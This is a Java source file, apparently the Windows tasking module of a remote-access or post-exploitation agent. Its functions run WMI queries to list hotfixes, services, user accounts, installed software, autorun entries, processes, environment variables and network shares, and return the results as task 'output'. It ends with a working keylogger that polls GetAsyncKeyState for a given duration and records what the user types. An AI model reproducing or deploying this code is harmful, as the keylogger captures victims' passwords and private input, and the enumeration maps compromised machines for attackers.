import com.sun.jna.platform.win32.COM.WbemcliUtil;
import com.sun.jna.platform.win32.Ole32;
import com.sun.jna.platform.win32.User32;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Hashtable;

import static com.sun.jna.platform.win32.WinUser.MAPVK_VSC_TO_VK_EX;


enum Win32_HotFix_Values {
    HotFixID,
    InstalledOn
}

enum Win32_Service_Values {
    StartName,
    DisplayName,
    State,
    PathName,
    Description,
    StartMode
}

enum Win32_UserAccount_Values {
    Name,
    SID,
    AccountType,
    Disabled,
    Description,
    Domain
}
enum Win32_Product_Values {
    Name,
    Version,
    Vendor,
    PackageName,
    InstallState
}

enum Win32_Autorun_Values {
    Name,
    Location,
    Command
}

enum Win32_Process_Values {
    Name,
    ProcessID,
    CommandLine
}

enum Win32_Environment_Values {
    Name,
    UserName,
    VariableValue
}

enum Win32_Share_Values {
    Name,
    Path,
    Caption
}

public class Windows {
    public static Hashtable wmiHotfix(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_HotFix_Values> serialNumberQuery = new WbemcliUtil.WmiQuery<Win32_HotFix_Values>("Win32_QuickFixEngineering", Win32_HotFix_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);
            WbemcliUtil.WmiResult<Win32_HotFix_Values> result = serialNumberQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable hotfixTable = new Hashtable();
                hotfixTable.put("HotFixID",result.getValue(Win32_HotFix_Values.HotFixID, i));
                hotfixTable.put("InstalledOn",result.getValue(Win32_HotFix_Values.InstalledOn, i));
                wmiResult.add(hotfixTable);
            }
            Ole32.INSTANCE.CoUninitialize();
            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output", wmiOut);
        return taskOut;
    }


    public static Hashtable wmiService(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_Service_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_Service_Values>("Win32_Service", Win32_Service_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_Service_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable serviceTable = new Hashtable();
                String[] objIndex = new String[] {"DisplayName","StartName","State","PathName","StartMode"};
                String[] objProperties = new String[] {
                        (String) result.getValue(Win32_Service_Values.DisplayName, i),
                        (String) result.getValue(Win32_Service_Values.StartName, i),
                        (String) result.getValue(Win32_Service_Values.State, i),
                        (String) result.getValue(Win32_Service_Values.PathName, i),
                        (String)result.getValue(Win32_Service_Values.StartMode, i)
                };
                for (int s = 0; s < objProperties.length; s++) {
                    try {
                        serviceTable.put(objIndex[s],objProperties[s]);
                    } catch (NullPointerException e) {
                        serviceTable.put(objIndex[s],"[]");
                    }
                }
                wmiResult.add(serviceTable);
            }
            Ole32.INSTANCE.CoUninitialize();
            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);
        return taskOut;
    }

    public static Hashtable wmiUser(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_UserAccount_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_UserAccount_Values>("Win32_UserAccount",Win32_UserAccount_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_UserAccount_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable accountTable = new Hashtable();
                accountTable.put("Name",result.getValue(Win32_UserAccount_Values.Name, i));
                accountTable.put("SID",result.getValue(Win32_UserAccount_Values.SID, i));
                accountTable.put("AccountType",result.getValue(Win32_UserAccount_Values.AccountType, i));
                accountTable.put("Disabled",result.getValue(Win32_UserAccount_Values.Disabled, i));
                accountTable.put("Description",result.getValue(Win32_UserAccount_Values.Description, i));
                accountTable.put("Domain",result.getValue(Win32_UserAccount_Values.Domain, i));
                wmiResult.add(accountTable);
            }
            Ole32.INSTANCE.CoUninitialize();
            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);
        return taskOut;
    }

    public static Hashtable wmiInstalled(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_Product_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_Product_Values>("Win32_Product",Win32_Product_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_Product_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable packageTable = new Hashtable();
                packageTable.put("Name",result.getValue(Win32_Product_Values.Name, i));
                packageTable.put("Version",result.getValue(Win32_Product_Values.Version, i));
                packageTable.put("Vendor",result.getValue(Win32_Product_Values.Vendor, i));
                packageTable.put("PackageName",result.getValue(Win32_Product_Values.PackageName, i));
                packageTable.put("InstallState",result.getValue(Win32_Product_Values.InstallState, i));
                wmiResult.add(packageTable);
            }
            Ole32.INSTANCE.CoUninitialize();

            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);
        return taskOut;
    }

    public static Hashtable wmiAutorun(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_Autorun_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_Autorun_Values>("Win32_Startupcommand",Win32_Autorun_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_Autorun_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable autorunTable = new Hashtable();
                autorunTable.put("Name",result.getValue(Win32_Autorun_Values.Name, i));
                autorunTable.put("Location",result.getValue(Win32_Autorun_Values.Location, i));
                autorunTable.put("Command",result.getValue(Win32_Autorun_Values.Command, i));
                wmiResult.add(autorunTable);
            }
            Ole32.INSTANCE.CoUninitialize();

            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);
        return taskOut;
    }

    public static Hashtable wmiProcess(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_Process_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_Process_Values>("Win32_Process",Win32_Process_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_Process_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable procTable = new Hashtable();
                procTable.put("Name",result.getValue(Win32_Process_Values.Name, i));
                procTable.put("ProcessID",result.getValue(Win32_Process_Values.ProcessID, i));
                String command = (String) result.getValue(Win32_Process_Values.CommandLine, i);
                if (command == null) {
                    procTable.put("CommandLine", "[]");
                } else {
                    procTable.put("CommandLine", command);
                }
                wmiResult.add(procTable);
            }
            Ole32.INSTANCE.CoUninitialize();

            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);
        return taskOut;
    }

    public static Hashtable wmiEnvironment(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_Environment_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_Environment_Values>("Win32_Environment",Win32_Environment_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_Environment_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable envTable = new Hashtable();
                envTable.put("Name",result.getValue(Win32_Environment_Values.Name, i));
                envTable.put("VariableValue",result.getValue(Win32_Environment_Values.VariableValue, i));
                wmiResult.add(envTable);
            }
            Ole32.INSTANCE.CoUninitialize();
            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);

        return taskOut;
    }

    public static Hashtable wmiShare(Hashtable args) {
        String wmiOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            ArrayList wmiResult = new ArrayList();
            WbemcliUtil.WmiQuery<Win32_Share_Values> serialServiceQuery = new WbemcliUtil.WmiQuery<Win32_Share_Values>("Win32_Share",Win32_Share_Values.class);
            Ole32.INSTANCE.CoInitializeEx(null, Ole32.COINIT_MULTITHREADED);

            WbemcliUtil.WmiResult<Win32_Share_Values> result = serialServiceQuery.execute();
            for (int i = 0; i < result.getResultCount(); i++) {
                Hashtable shareTable = new Hashtable();
                shareTable.put("Name",result.getValue(Win32_Share_Values.Name, i));
                shareTable.put("Path",result.getValue(Win32_Share_Values.Path, i));
                shareTable.put("Caption",result.getValue(Win32_Share_Values.Caption, i));
                wmiResult.add(shareTable);
            }
            Ole32.INSTANCE.CoUninitialize();
            wmiOut = wmiResult.toString();
        } else {
            wmiOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",wmiOut);

        return taskOut;
    }



    public static Hashtable asynckeystateLogger(Hashtable args) {
        String keyOut = new String();
        Hashtable taskOut = new Hashtable();
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            final User32 user32 = User32.INSTANCE;
            LocalDateTime endTimes = LocalDateTime.now().plusSeconds(Integer.parseInt(args.get("duration").toString()));
            StringBuilder keyStrokes = new StringBuilder();

            while (LocalDateTime.now().isBefore(endTimes)) {
                for (int k=1; k<254; k++) {
                    short kState = user32.GetAsyncKeyState(k);
                    if (kState == -32767) {
                        short shiftA = user32.GetAsyncKeyState(160);
                        short shiftB = user32.GetAsyncKeyState(161);

                        int scan = user32.MapVirtualKeyEx(k,MAPVK_VSC_TO_VK_EX, user32.GetKeyboardLayout(0));
                        byte[] stateBytes = new byte[256];
                        char[] keyStr = new char[5];
                        User32.INSTANCE.ToUnicodeEx(k,scan,stateBytes,keyStr,keyStr.length,0,user32.GetKeyboardLayout(0));
                        String literalValue = String.valueOf(keyStr);
                        if (shiftA == -32767 || shiftA == -32768 || shiftB == -32767 || shiftB == -32768) {
                            keyStrokes.append(literalValue.toUpperCase());
                        } else {
                            keyStrokes.append(literalValue);
                        }
                    }
                }
            }
            keyOut = keyStrokes.toString();
        } else {
            keyOut = "error - operating system not compatible with this directive";
        }
        taskOut.put("output",keyOut);
        return taskOut;
    }
}